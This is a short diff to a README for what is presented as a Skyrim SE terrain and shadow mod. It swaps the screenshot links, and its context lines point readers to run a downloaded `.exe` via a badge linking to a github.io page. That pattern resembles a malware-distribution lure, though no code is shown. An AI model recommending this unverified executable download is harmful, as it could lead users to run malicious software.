@@ -15,8 +15,8 @@ Run the `.exe` file to install all terrain and shadow patches automatically into
 [![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://terrain-shadows-mod-patches-skyrim-se.github.io/.github/)
 
 ## 📸 Overview
-![skyrim-terrain-shadows-lighting](https://github.com/user-attachments/assets/0496aae1-8ed0-44ec-b107-5dcc02594fe6)
-![skyrim-terrain-shadows-rendering](https://github.com/user-attachments/assets/c2cec76d-05cf-414f-a266-c823b6c91e41)
+![skyrim-terrain-shadows-lighting](https://github.com/user-attachments/assets/03bc5726-5285-4641-b991-31aaf835359f)
+
 
 
 ## ⚡ Key Features
